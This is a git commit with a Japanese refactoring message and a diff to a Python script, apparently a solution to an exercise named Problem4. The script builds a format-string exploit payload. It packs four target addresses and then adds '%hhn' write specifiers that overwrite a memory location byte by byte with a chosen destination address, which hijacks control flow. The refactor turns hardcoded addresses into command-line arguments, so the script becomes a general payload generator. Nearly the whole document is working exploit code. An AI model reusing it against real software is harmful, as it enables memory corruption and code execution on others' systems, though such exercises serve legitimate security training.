488f691a124a17b05130b9be21c2c30ffc78a4c3
Ryoma Yamada <ryoma.yamada30@gmail.com>
2018-06-17 12:12:17 +0900

    リファクタリング

--- Problem4/villager_a.py
+++ Problem4/villager_a.py
@@ -3,27 +3,28 @@
 
 import sys
 import struct
-from subprocess import Popen
 
-tgt_addr = 0x80499e0
-dst_addr = 0x8048691
-off_set = 6
+# ターゲットアドレス
+tgt_addr = int(sys.argv[1], 16) 
+# 飛ばしたい宛先アドレス
+dst_addr = int(sys.argv[2], 16)
+# オフセット 
+offset = int(sys.argv[3])
 
-ef = (0x91 - 16) % 256
-be = (0x86 - 16 - ef) % 256
-ad = (0x04 - 16 - ef - be) % 256
-de = (0x08 - 16 - ef - be - ad) % 256
+# 書き込み用文字列
+code = b''
 
+for i in range(4):
+    code += ((tgt_addr+i).to_bytes(4, byteorder='little'))
 
+dst = (dst_addr.to_bytes(4, byteorder='little'))
 
-buf = (struct.pack('<I', tgt_addr))      # \xef
-buf += (struct.pack('<I', tgt_addr + 1)) # \xbe
-buf += (struct.pack('<I', tgt_addr + 2)) # \xad
-buf += (struct.pack('<I', tgt_addr + 3)) # \xde
+shift = 16
 
-buf += bytes("%"+str(ef)+"c%6\$hhn")
-buf += bytes("%"+str(be)+"c%7\$hhn")
-buf += bytes("%"+str(ad)+"c%8\$hhn")
-buf += bytes("%"+str(de)+"c%9\$hhn")
+# バイトずつ値を書き込み
+for i in range(len(dst)):
+    dst_pos = (dst[i] - shift) % 256
+    code += bytes(("%"+str(dst_pos) +"x%"+str(offset+i)+"$hhn").encode('utf-8'))
+    shift +=dst_pos
  
-print(buf)
+print(code)
